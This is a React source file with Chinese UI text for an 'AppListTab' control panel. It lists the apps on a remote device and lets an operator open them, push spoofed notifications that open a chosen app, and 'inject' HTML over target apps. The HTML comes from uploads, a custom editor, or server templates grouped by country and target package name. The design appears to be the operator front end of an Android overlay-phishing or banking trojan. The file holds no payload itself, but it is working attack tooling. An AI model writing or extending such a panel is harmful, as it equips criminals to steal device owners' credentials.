/**
 * 应用列表Tab - 应用管理与注入
 * 从 ControlPage.jsx 提取 (lines 1983-2234)
 */
import { useState } from 'react'
import { api } from '../../api/client'

export default function AppListTab({
  appLoading,
  appSearch,
  setAppSearch,
  appList,
  getFilteredApps,
  fetchAppList,
  fetchAppListFromDevice,
  openApp,
  stopInjection,
  showInjectModal,
  sendAppNotification,
  appDetail,
  injActivePkgs,
  appDetailApp,
  setAppDetailApp,
  notifyApp,
  setNotifyApp,
  notifyTitle,
  setNotifyTitle,
  notifyContent,
  setNotifyContent,
  notifyButton,
  setNotifyButton,
  confirmSendNotification,
  htmlInjectApp,
  setHtmlInjectApp,
  injectHtmlFile,
  setInjectHtmlFile,
  injectPreview,
  setInjectPreview,
  injectTab,
  setInjectTab,
  injectCustomHtml,
  setInjectCustomHtml,
  injectPreviewHtml,
  setInjectPreviewHtml,
  confirmInjectHtml,
  centerToast,
}) {
  const filteredApps = getFilteredApps()
  const [templateList, setTemplateList] = useState([])
  const [templateLoading, setTemplateLoading] = useState(false)
  const [templateCountry, setTemplateCountry] = useState(null)
  const [selectedTemplate, setSelectedTemplate] = useState(null)

  const fetchTemplates = async () => {
    setTemplateLoading(true)
    try {
      const res = await api.request('/api/injection/templates')
      const list = Array.isArray(res) ? res : (res?.data || res?.templates || [])
      setTemplateList(list)
    } catch (e) {
      centerToast('获取模板列表失败: ' + e.message, 'err')
    } finally {
      setTemplateLoading(false)
    }
  }

  const getTemplateCountries = () => {
    const map = {}
    templateList.forEach(t => {
      const country = (t.country && t.country.trim()) || '其他'
      if (!map[country]) map[country] = []
      map[country].push(t)
    })
    return map
  }

  const handleTemplateEdit = async (tmpl) => {
    try {
      const res = await api.request(`/api/injection/templates/${tmpl.id}`)
      const html = res?.data?.htmlContent || res?.data?.html_content || res?.htmlContent || res?.html_content || ''
      setInjectCustomHtml(html)
      setInjectTab('custom')
    } catch (e) {
      centerToast('获取模板内容失败: ' + e.message, 'err')
    }
  }

  const handleTemplatePreview = async (tmpl) => {
    try {
      const res = await api.request(`/api/injection/templates/${tmpl.id}`)
      const html = res?.data?.htmlContent || res?.data?.html_content || res?.htmlContent || res?.html_content || ''
      setInjectPreviewHtml(html)
      setInjectPreview(true)
    } catch (e) {
      centerToast('获取模板内容失败: ' + e.message, 'err')
    }
  }

  const handleTemplateSelect = (tmpl) => {
    setSelectedTemplate(selectedTemplate?.id === tmpl.id ? null : tmpl)
  }

  const handleTemplateInject = async () => {
    if (!selectedTemplate) return
    try {
      const res = await api.request(`/api/injection/templates/${selectedTemplate.id}`)
      const html = res?.data?.htmlContent || res?.data?.html_content || res?.htmlContent || res?.html_content || ''
      setInjectCustomHtml(html)
      confirmInjectHtml()
    } catch (e) {
      centerToast('获取模板内容失败: ' + e.message, 'err')
    }
  }
  return (
    <div className="ctrl-tab-content">
      <div className="ctrl-tab-panel">
        <div style={{ padding: 16, background: 'rgba(255,255,255,.03)', borderRadius: 12, border: '1px solid rgba(255,255,255,.08)', display: 'flex', flexDirection: 'column', height: '100%' }}>
          <div style={{ display: 'flex', alignItems: 'center', marginBottom: 12, paddingBottom: 8, borderBottom: '1px solid rgba(255,255,255,.08)' }}>
            <div style={{ width: 4, height: 18, background: '#1890ff', borderRadius: 2, marginRight: 8 }} />
            <span style={{ fontSize: 15, fontWeight: 500, color: '#fff' }}>应用列表</span>
          </div>

          <div style={{ display: 'flex', gap: 8, alignItems: 'center', flexWrap: 'wrap', marginBottom: 12 }}>
            <button
              onClick={fetchAppList}
              disabled={appLoading}
              style={{ padding: '6px 14px', background: 'linear-gradient(135deg, #1890ff, #096dd9)', border: 'none', borderRadius: 6, color: '#fff', fontSize: 12, fontWeight: 600, cursor: appLoading ? 'wait' : 'pointer' }}
            >{appLoading ? '加载中...' : '🔄 刷新应用列表'}</button>
            {fetchAppListFromDevice && <button
              onClick={fetchAppListFromDevice}
              disabled={appLoading}
              style={{ padding: '6px 14px', background: 'linear-gradient(135deg, #52c41a, #389e0d)', border: 'none', borderRadius: 6, color: '#fff', fontSize: 12, fontWeight: 600, cursor: appLoading ? 'wait' : 'pointer' }}
            >{appLoading ? '获取中...' : '📱 重新获取(设备)'}</button>}
            <input
              type="text"
              placeholder="搜索应用名称或包名"
              value={appSearch}
              onChange={e => setAppSearch(e.target.value)}
              style={{ width: 200, padding: '6px 10px', background: 'rgba(255,255,255,.05)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 6, color: '#fff', fontSize: 12 }}
            />
            <span style={{ marginLeft: 'auto', color: '#94a3b8', fontSize: 12 }}>共 <strong style={{ color: '#38bdf8' }}>{filteredApps.length}</strong> 个应用</span>
          </div>

          <div style={{ flex: 1, minHeight: 0, overflow: 'auto' }}>
            <table style={{ width: '100%', borderCollapse: 'collapse' }}>
              <thead>
                <tr style={{ background: 'rgba(255,255,255,.05)', borderBottom: '1px solid rgba(255,255,255,.08)' }}>
                  <th style={{ padding: '8px 12px', textAlign: 'center', color: '#94a3b8', fontSize: 11, fontWeight: 600, width: 50 }}>图标</th>
                  <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>应用名称</th>
                  <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>包名</th>
                  <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600, width: 80 }}>版本</th>
                  <th style={{ padding: '8px 12px', textAlign: 'center', color: '#94a3b8', fontSize: 11, fontWeight: 600, width: 50 }}>状态</th>
                  <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600, width: 280 }}>操作</th>
                </tr>
              </thead>
              <tbody>
                {appLoading ? (
                  <tr><td colSpan={6} style={{ padding: 40, textAlign: 'center', color: '#94a3b8' }}>获取中...</td></tr>
                ) : filteredApps.length === 0 ? (
                  <tr><td colSpan={6} style={{ padding: 40, textAlign: 'center', color: '#94a3b8' }}>
                    <div style={{ fontSize: 32, marginBottom: 8, opacity: 0.5 }}>📱</div>
                    <div style={{ fontSize: 13 }}>请先获取数据</div>
                    <div style={{ fontSize: 11, marginTop: 4, color: '#64748b' }}>点击"获取应用列表"按钮获取应用列表</div>
                  </td></tr>
                ) : (
                  filteredApps.map((app, i) => {
                    const iconSrc = app.icon ? (app.icon.startsWith('data:') || app.icon.startsWith('http') ? app.icon : `data:image/png;base64,${app.icon}`) : ''
                    return (
                      <tr key={i} style={{ borderBottom: '1px solid rgba(255,255,255,.05)' }}>
                        <td style={{ padding: '6px 12px', textAlign: 'center' }}>
                          {iconSrc ? <img src={iconSrc} alt="" style={{ width: 24, height: 24, borderRadius: 4 }} /> : <span style={{ fontSize: 20 }}>📱</span>}
                        </td>
                        <td style={{ padding: '6px 12px', color: '#e2e8f0', fontSize: 12 }}>{app.appName || app.name || '--'}</td>
                        <td style={{ padding: '6px 12px', color: '#94a3b8', fontSize: 11, wordBreak: 'break-all' }}>{app.packageName || app.package || '--'}</td>
                        <td style={{ padding: '6px 12px', color: '#94a3b8', fontSize: 11 }}>{app.version || app.versionName || '--'}</td>
                        <td style={{ padding: '6px 12px', textAlign: 'center', fontSize: 16 }}>💉</td>
                        <td style={{ padding: '6px 12px', display: 'flex', gap: 4, flexWrap: 'wrap' }}>
                          <button onClick={() => openApp(app)} style={{ padding: '2px 8px', fontSize: 10, borderRadius: 4, border: '1px solid rgba(82,196,26,.3)', background: 'rgba(82,196,26,.1)', color: '#52c41a', cursor: 'pointer' }}>🚀打开</button>
                          {injActivePkgs.has(app.packageName || app.package) ? (
                            <button onClick={() => stopInjection(app)} style={{ padding: '2px 8px', fontSize: 10, borderRadius: 4, border: '1px solid rgba(239,68,68,.3)', background: 'rgba(239,68,68,.15)', color: '#ef4444', cursor: 'pointer' }}>✕关闭</button>
                          ) : (
                            <button onClick={() => showInjectModal(app)} style={{ padding: '2px 8px', fontSize: 10, borderRadius: 4, border: '1px solid rgba(168,85,247,.3)', background: 'rgba(168,85,247,.1)', color: '#a855f7', cursor: 'pointer' }}>💉注入</button>
                          )}
                          <button onClick={() => sendAppNotification(app)} style={{ padding: '2px 8px', fontSize: 10, borderRadius: 4, border: '1px solid rgba(250,173,20,.3)', background: 'rgba(250,173,20,.1)', color: '#faad14', cursor: 'pointer' }}>🔔通知</button>
                          <button onClick={() => appDetail(app)} style={{ padding: '2px 8px', fontSize: 10, borderRadius: 4, border: '1px solid rgba(56,189,248,.3)', background: 'rgba(56,189,248,.1)', color: '#38bdf8', cursor: 'pointer' }}>📋详情</button>
                        </td>
                      </tr>
                    )
                  })
                )}
              </tbody>
            </table>
          </div>

          <div style={{ marginTop: 8, paddingTop: 8, borderTop: '1px solid rgba(255,255,255,.08)', display: 'flex', justifyContent: 'flex-end', alignItems: 'center' }}>
            <span style={{ color: '#94a3b8', fontSize: 12 }}>共 {appList.length} 项</span>
          </div>
        </div>
      </div>

      {appDetailApp && (
        <div className="overlay-modal-backdrop" onClick={e => { if (e.target === e.currentTarget) setAppDetailApp(null) }}>
          <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', width: 500, background: '#fff', borderRadius: 12, boxShadow: '0 6px 16px rgba(0,0,0,.08), 0 3px 6px rgba(0,0,0,.12)', zIndex: 1001, overflow: 'hidden' }}>
            <div style={{ padding: '14px 20px', borderBottom: '1px solid #e8e8e8', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
              <span style={{ fontWeight: 600, fontSize: 15, color: '#303133' }}>📱 应用详情 - {appDetailApp.appName || appDetailApp.name || '--'}</span>
              <button onClick={() => setAppDetailApp(null)} style={{ border: 'none', background: 'transparent', fontSize: 20, color: '#999', cursor: 'pointer', lineHeight: 1 }}>×</button>
            </div>
            <div style={{ padding: '20px', color: '#333' }}>
              {appDetailApp.icon && <div style={{ marginBottom: 16, textAlign: 'center' }}><img alt="app icon" src={appDetailApp.icon.startsWith('data:') || appDetailApp.icon.startsWith('http') ? appDetailApp.icon : `data:image/png;base64,${appDetailApp.icon}`} style={{ width: 64, height: 64, borderRadius: 8 }} /></div>}
              <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 13 }}>
                <tbody>
                  {[['应用名称', appDetailApp.appName || appDetailApp.name], ['包名', appDetailApp.packageName || appDetailApp.package], ['版本名称', appDetailApp.versionName], ['版本号', appDetailApp.versionCode], ['是否系统应用', appDetailApp.isSystemApp || appDetailApp.isSystem ? '是' : '否'], ['安装时间', (appDetailApp.firstInstallTime || appDetailApp.installTime) ? new Date(appDetailApp.firstInstallTime || appDetailApp.installTime).toLocaleString('zh-CN') : '--'], ['更新时间', (appDetailApp.lastUpdateTime || appDetailApp.updateTime) ? new Date(appDetailApp.lastUpdateTime || appDetailApp.updateTime).toLocaleString('zh-CN') : '--'], ['APK大小', appDetailApp.apkSize ? `${(appDetailApp.apkSize / 1024 / 1024).toFixed(2)} MB` : '--']].map(([label, value]) => (
                    <tr key={label} style={{ borderBottom: '1px solid #f0f0f0' }}>
                      <th style={{ padding: '10px 14px', textAlign: 'left', background: '#fafafa', color: '#666', fontWeight: 500, width: 120 }}>{label}</th>
                      <td style={{ padding: '10px 14px', color: '#303133' }}>{value || '--'}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
            <div style={{ padding: '12px 20px', borderTop: '1px solid #e8e8e8', textAlign: 'right' }}>
              <button onClick={() => setAppDetailApp(null)} style={{ padding: '6px 16px', border: '1px solid #d9d9d9', borderRadius: 6, background: '#fff', color: '#666', fontSize: 13, cursor: 'pointer' }}>关 闭</button>
            </div>
          </div>
        </div>
      )}

      {notifyApp && (
        <div className="overlay-modal-backdrop" onClick={e => { if (e.target === e.currentTarget) setNotifyApp(null) }}>
          <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', width: 480, background: '#fff', borderRadius: 12, boxShadow: '0 6px 16px rgba(0,0,0,.08)', zIndex: 1001, overflow: 'hidden' }}>
            <div style={{ padding: '14px 20px', borderBottom: '1px solid #e8e8e8', display: 'flex', alignItems: 'center', gap: 10 }}>
              <span style={{ fontSize: 18 }}>🔔</span>
              <span style={{ fontWeight: 600, fontSize: 15, color: '#303133' }}>发送通知</span>
              {notifyApp.icon && <img alt="" src={notifyApp.icon.startsWith('data:') ? notifyApp.icon : `data:image/png;base64,${notifyApp.icon}`} style={{ width: 24, height: 24, marginLeft: 8 }} />}
              <span style={{ color: '#666', fontSize: 14 }}>{notifyApp.appName || notifyApp.name}</span>
              <button onClick={() => setNotifyApp(null)} style={{ marginLeft: 'auto', border: 'none', background: 'transparent', fontSize: 20, color: '#999', cursor: 'pointer' }}>×</button>
            </div>
            <div style={{ padding: '20px' }}>
              <div style={{ marginBottom: 14 }}>
                <div style={{ marginBottom: 6, fontWeight: 500, color: '#303133', fontSize: 13 }}>通知标题 <span style={{ color: '#909399', fontWeight: 400 }}>(选填)</span></div>
                <input placeholder="不填则不显示标题" maxLength={50} value={notifyTitle} onChange={e => setNotifyTitle(e.target.value)} style={{ width: '100%', padding: '8px 12px', border: '1px solid #dcdfe6', borderRadius: 6, fontSize: 13, outline: 'none', boxSizing: 'border-box' }} />
              </div>
              <div style={{ marginBottom: 14 }}>
                <div style={{ marginBottom: 6, fontWeight: 500, color: '#303133', fontSize: 13 }}><span style={{ color: '#ff4d4f' }}>*</span> 通知内容</div>
                <textarea placeholder="请输入通知内容" rows={4} maxLength={200} value={notifyContent} onChange={e => setNotifyContent(e.target.value)} style={{ width: '100%', padding: '8px 12px', border: '1px solid #dcdfe6', borderRadius: 6, fontSize: 13, outline: 'none', resize: 'vertical', boxSizing: 'border-box' }} />
              </div>
              <div style={{ marginBottom: 14 }}>
                <div style={{ marginBottom: 6, fontWeight: 500, color: '#303133', fontSize: 13 }}>按钮文字 <span style={{ color: '#909399', fontWeight: 400 }}>(选填)</span></div>
                <input placeholder="不填则不显示按钮" maxLength={20} value={notifyButton} onChange={e => setNotifyButton(e.target.value)} style={{ width: '100%', padding: '8px 12px', border: '1px solid #dcdfe6', borderRadius: 6, fontSize: 13, outline: 'none', boxSizing: 'border-box' }} />
              </div>
              <div style={{ background: '#fff7e6', border: '1px solid #ffd591', borderRadius: 6, padding: 12, fontSize: 13 }}>
                <div style={{ color: '#fa8c16', fontWeight: 500, marginBottom: 4 }}>💡 提示</div>
                <div style={{ color: '#666' }}>通知将显示在设备通知栏，用户点击通知后将自动打开 <strong>{notifyApp.appName || notifyApp.name}</strong></div>
              </div>
            </div>
            <div style={{ padding: '12px 20px', borderTop: '1px solid #e8e8e8', display: 'flex', justifyContent: 'flex-end', gap: 10 }}>
              <button onClick={() => setNotifyApp(null)} style={{ padding: '6px 16px', border: '1px solid #d9d9d9', borderRadius: 6, background: '#fff', color: '#666', fontSize: 13, cursor: 'pointer' }}>取 消</button>
              <button onClick={confirmSendNotification} style={{ padding: '6px 16px', border: 'none', borderRadius: 6, background: '#ff4d4f', color: '#fff', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>发送通知</button>
            </div>
          </div>
        </div>
      )}

      {htmlInjectApp && (
        <div className="overlay-modal-backdrop" onClick={e => { if (e.target === e.currentTarget) { setHtmlInjectApp(null); setInjectHtmlFile(null); setInjectPreview(false) } }}>
          <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', width: 540, maxHeight: '90vh', background: '#1e293b', borderRadius: 12, boxShadow: '0 8px 32px rgba(0,0,0,.4)', zIndex: 1001, overflow: 'hidden', border: '1px solid rgba(255,255,255,.08)', display: 'flex', flexDirection: 'column' }}>
            <div style={{ padding: '14px 20px', borderBottom: '1px solid rgba(255,255,255,.08)', display: 'flex', alignItems: 'center', gap: 10, flexShrink: 0 }}>
              <span style={{ fontSize: 18 }}>💉</span>
              <span style={{ fontWeight: 600, fontSize: 15, color: '#e2e8f0' }}>HTML注入</span>
              <button onClick={() => { setHtmlInjectApp(null); setInjectHtmlFile(null); setInjectPreview(false) }} style={{ marginLeft: 'auto', border: 'none', background: 'transparent', fontSize: 20, color: '#94a3b8', cursor: 'pointer' }}>×</button>
            </div>
            <div style={{ padding: '16px 20px', overflowY: 'auto', flex: 1 }}>
              <div style={{ marginBottom: 14, padding: '10px 14px', background: 'rgba(255,255,255,.04)', borderRadius: 6, border: '1px solid rgba(255,255,255,.08)' }}>
                <span style={{ fontSize: 12, color: '#94a3b8' }}>目标应用：</span>
                <span style={{ fontSize: 13, color: '#e2e8f0', fontWeight: 500 }}>{htmlInjectApp.packageName || htmlInjectApp.package}</span>
              </div>
              <div style={{ display: 'flex', gap: 0, marginBottom: 14, borderBottom: '1px solid rgba(255,255,255,.08)' }}>
                <button onClick={() => { setInjectTab('template'); if (templateList.length === 0) fetchTemplates() }} style={{ padding: '8px 16px', border: 'none', background: 'transparent', color: injectTab === 'template' ? '#a855f7' : '#94a3b8', fontSize: 13, fontWeight: 500, cursor: 'pointer', borderBottom: injectTab === 'template' ? '2px solid #a855f7' : '2px solid transparent', transition: 'all .2s' }}>📚 模板获取</button>
                <button onClick={() => setInjectTab('upload')} style={{ padding: '8px 16px', border: 'none', background: 'transparent', color: injectTab === 'upload' ? '#a855f7' : '#94a3b8', fontSize: 13, fontWeight: 500, cursor: 'pointer', borderBottom: injectTab === 'upload' ? '2px solid #a855f7' : '2px solid transparent', transition: 'all .2s' }}>📄 上传HTML</button>
                <button onClick={() => setInjectTab('custom')} style={{ padding: '8px 16px', border: 'none', background: 'transparent', color: injectTab === 'custom' ? '#a855f7' : '#94a3b8', fontSize: 13, fontWeight: 500, cursor: 'pointer', borderBottom: injectTab === 'custom' ? '2px solid #a855f7' : '2px solid transparent', transition: 'all .2s' }}>✏️ 自定义HTML</button>
              </div>
              {injectTab === 'upload' && (
                <div>
                  <div
                    style={{ border: '2px dashed rgba(255,255,255,.15)', borderRadius: 8, padding: '28px 20px', textAlign: 'center', cursor: 'pointer', transition: 'border-color .2s', background: injectHtmlFile ? 'rgba(34,197,94,.08)' : 'rgba(255,255,255,.03)' }}
                    onDragOver={e => { e.preventDefault(); e.currentTarget.style.borderColor = '#a855f7' }}
                    onDragLeave={e => { e.currentTarget.style.borderColor = 'rgba(255,255,255,.15)' }}
                    onDrop={e => { e.preventDefault(); e.currentTarget.style.borderColor = 'rgba(255,255,255,.15)'; const f = e.dataTransfer.files[0]; if (f && /\.(html?|htm)$/i.test(f.name)) { setInjectHtmlFile(f); const r = new FileReader(); r.onload = ev => { setInjectCustomHtml(ev.target.result); setInjectTab('custom') }; r.readAsText(f) } else centerToast('请上传 .html/.htm 文件', 'err') }}
                    onClick={() => { const inp = document.createElement('input'); inp.type = 'file'; inp.accept = '.html,.htm'; inp.onchange = (ev) => { const f = ev.target.files[0]; if (f) { setInjectHtmlFile(f); const r = new FileReader(); r.onload = e => { setInjectCustomHtml(e.target.result); setInjectTab('custom') }; r.readAsText(f) } }; inp.click() }}
                  >
                    {injectHtmlFile ? (
                      <div>
                        <div style={{ fontSize: 28, marginBottom: 6 }}>✅</div>
                        <div style={{ fontSize: 13, color: '#e2e8f0', fontWeight: 500 }}>{injectHtmlFile.name}</div>
                        <div style={{ fontSize: 11, color: '#94a3b8', marginTop: 4 }}>{(injectHtmlFile.size / 1024).toFixed(1)} KB · 点击重新选择</div>
                      </div>
                    ) : (
                      <div>
                        <div style={{ fontSize: 28, marginBottom: 6 }}>📄</div>
                        <div style={{ fontSize: 13, color: '#cbd5e1' }}>拖拽或点击上传 .html/.htm 文件</div>
                        <div style={{ fontSize: 11, color: '#64748b', marginTop: 4 }}>支持拖拽上传</div>
                      </div>
                    )}
                  </div>
                </div>
              )}
              {injectTab === 'custom' && (
                <div>
                  <textarea
                    value={injectCustomHtml}
                    onChange={e => setInjectCustomHtml(e.target.value)}
                    onKeyDown={e => {
                      if (e.key === 'Tab') {
                        e.preventDefault()
                        const start = e.target.selectionStart
                        const end = e.target.selectionEnd
                        const val = e.target.value
                        setInjectCustomHtml(val.substring(0, start) + '  ' + val.substring(end))
                        setTimeout(() => { e.target.selectionStart = e.target.selectionEnd = start + 2 }, 0)
                      }
                    }}
                    placeholder={'<!DOCTYPE html>\n<html>\n<head>\n  <title>注入页面</title>\n</head>\n<body>\n  <!-- 在此编写HTML -->\n</body>\n</html>'}
                    spellCheck={false}
                    style={{ width: '100%', minHeight: 300, padding: '14px 16px', background: '#1e1e2e', border: '1px solid rgba(255,255,255,.1)', borderRadius: 8, color: '#e2e8f0', fontSize: 13, fontFamily: "'JetBrains Mono', 'Fira Code', 'Cascadia Code', Consolas, monospace", lineHeight: 1.6, resize: 'vertical', outline: 'none', boxSizing: 'border-box', caretColor: '#a855f7' }}
                  />
                </div>
              )}
              {injectTab === 'template' && (
                <div>
                  {templateLoading ? (
                    <div style={{ textAlign: 'center', padding: 30, color: '#94a3b8' }}>加载中...</div>
                  ) : templateList.length === 0 ? (
                    <div style={{ textAlign: 'center', padding: 30, color: '#94a3b8' }}>
                      <div style={{ fontSize: 28, marginBottom: 8 }}>📚</div>
                      <div style={{ fontSize: 13 }}>暂无模板</div>
                      <button onClick={fetchTemplates} style={{ marginTop: 10, padding: '6px 14px', background: 'rgba(168,85,247,.15)', border: '1px solid rgba(168,85,247,.3)', borderRadius: 6, color: '#a855f7', fontSize: 12, cursor: 'pointer' }}>🔄 重新获取</button>
                    </div>
                  ) : !templateCountry ? (
                    <div>
                      <div style={{ fontSize: 12, color: '#94a3b8', marginBottom: 10 }}>选择国家/地区：</div>
                      <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
                        {Object.entries(getTemplateCountries()).map(([country, items]) => (
                          <div
                            key={country}
                            onClick={() => setTemplateCountry(country)}
                            style={{ padding: '10px 16px', background: 'rgba(255,255,255,.05)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 8, cursor: 'pointer', transition: 'all .2s', minWidth: 80, textAlign: 'center' }}
                            onMouseEnter={e => { e.currentTarget.style.borderColor = '#a855f7'; e.currentTarget.style.background = 'rgba(168,85,247,.1)' }}
                            onMouseLeave={e => { e.currentTarget.style.borderColor = 'rgba(255,255,255,.1)'; e.currentTarget.style.background = 'rgba(255,255,255,.05)' }}
                          >
                            <div style={{ fontSize: 14, fontWeight: 500, color: '#e2e8f0' }}>{country}</div>
                            <div style={{ fontSize: 11, color: '#64748b', marginTop: 2 }}>{items.length} 个模板</div>
                          </div>
                        ))}
                      </div>
                    </div>
                  ) : (
                    <div>
                      <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 12 }}>
                        <button onClick={() => setTemplateCountry(null)} style={{ padding: '4px 10px', border: '1px solid rgba(255,255,255,.1)', borderRadius: 4, background: 'rgba(255,255,255,.05)', color: '#94a3b8', fontSize: 12, cursor: 'pointer' }}>← 返回</button>
                        <span style={{ fontSize: 13, color: '#e2e8f0', fontWeight: 500 }}>{templateCountry}</span>
                        <span style={{ fontSize: 11, color: '#64748b' }}>({(getTemplateCountries()[templateCountry] || []).length} 个模板)</span>
                      </div>
                      <div style={{ maxHeight: 280, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: 6 }}>
                        {(getTemplateCountries()[templateCountry] || []).map(tmpl => (
                          <div
                            key={tmpl.id}
                            onClick={() => handleTemplateSelect(tmpl)}
                            style={{ display: 'flex', alignItems: 'center', padding: '10px 12px', background: selectedTemplate?.id === tmpl.id ? 'rgba(168,85,247,.15)' : 'rgba(255,255,255,.03)', border: selectedTemplate?.id === tmpl.id ? '1px solid rgba(168,85,247,.4)' : '1px solid rgba(255,255,255,.08)', borderRadius: 6, cursor: 'pointer', transition: 'all .2s' }}
                          >
                            <div style={{ flex: 1, minWidth: 0 }}>
                              <div style={{ fontSize: 13, color: '#e2e8f0', fontWeight: 500, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{tmpl.name || tmpl.title || tmpl.package_name || '未命名模板'}</div>
                              <div style={{ fontSize: 11, color: '#64748b', marginTop: 2, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{tmpl.package_name || tmpl.packageName || tmpl.pkg || ''}</div>
                            </div>
                            <div style={{ display: 'flex', gap: 6, marginLeft: 8, flexShrink: 0 }}>
                              <button onClick={(e) => { e.stopPropagation(); handleTemplateEdit(tmpl) }} style={{ padding: '3px 8px', fontSize: 11, borderRadius: 4, border: '1px solid rgba(56,189,248,.3)', background: 'rgba(56,189,248,.1)', color: '#38bdf8', cursor: 'pointer' }}>✏️ 编辑</button>
                              <button onClick={(e) => { e.stopPropagation(); handleTemplatePreview(tmpl) }} style={{ padding: '3px 8px', fontSize: 11, borderRadius: 4, border: '1px solid rgba(34,197,94,.3)', background: 'rgba(34,197,94,.1)', color: '#22c55e', cursor: 'pointer' }}>👁 预览</button>
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              )}
              {injectPreview && (
                <div style={{ marginTop: 14 }}>
                  <div style={{ fontSize: 12, color: '#94a3b8', marginBottom: 6 }}>👁 手机端预览 (375×667)</div>
                  <div style={{ display: 'flex', justifyContent: 'center' }}>
                    <div style={{ width: 375, height: 667, border: '2px solid rgba(255,255,255,.15)', borderRadius: 16, overflow: 'hidden', background: '#fff', boxShadow: '0 4px 20px rgba(0,0,0,.3)' }}>
                      <iframe
                        srcDoc={injectPreviewHtml}
                        style={{ width: '100%', height: '100%', border: 'none', display: 'block' }}
                        sandbox="allow-scripts allow-same-origin"
                        title="HTML预览"
                      />
                    </div>
                  </div>
                </div>
              )}
            </div>
            <div style={{ padding: '12px 20px', borderTop: '1px solid rgba(255,255,255,.08)', display: 'flex', justifyContent: 'flex-end', gap: 10, flexShrink: 0 }}>
              <button onClick={() => { if (injectPreview) { setInjectPreview(false); return } if (injectTab === 'custom' && injectCustomHtml.trim()) { setInjectPreviewHtml(injectCustomHtml); setInjectPreview(true) } else if (injectTab === 'upload' && injectHtmlFile) { const r = new FileReader(); r.onload = ev => { setInjectPreviewHtml(ev.target.result); setInjectPreview(true) }; r.readAsText(injectHtmlFile) } else { centerToast('无内容可预览', 'err') } }} style={{ padding: '6px 16px', border: '1px solid rgba(255,255,255,.12)', borderRadius: 6, background: 'rgba(255,255,255,.05)', color: '#e2e8f0', fontSize: 13, cursor: 'pointer' }}>{injectPreview ? '👁 关闭预览' : '👁 预览'}</button>
              <button onClick={() => { setHtmlInjectApp(null); setInjectHtmlFile(null); setInjectPreview(false) }} style={{ padding: '6px 16px', border: '1px solid rgba(255,255,255,.12)', borderRadius: 6, background: 'rgba(255,255,255,.05)', color: '#94a3b8', fontSize: 13, cursor: 'pointer' }}>取消</button>
              <button onClick={injectTab === 'template' && selectedTemplate ? handleTemplateInject : confirmInjectHtml} disabled={injectTab === 'template' ? !selectedTemplate : !injectCustomHtml.trim()} style={{ padding: '6px 16px', border: 'none', borderRadius: 6, background: (injectTab === 'template' ? selectedTemplate : injectCustomHtml.trim()) ? '#a855f7' : 'rgba(168,85,247,.3)', color: '#fff', fontSize: 13, fontWeight: 600, cursor: (injectTab === 'template' ? selectedTemplate : injectCustomHtml.trim()) ? 'pointer' : 'not-allowed', opacity: (injectTab === 'template' ? selectedTemplate : injectCustomHtml.trim()) ? 1 : 0.6 }}>发送注入</button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
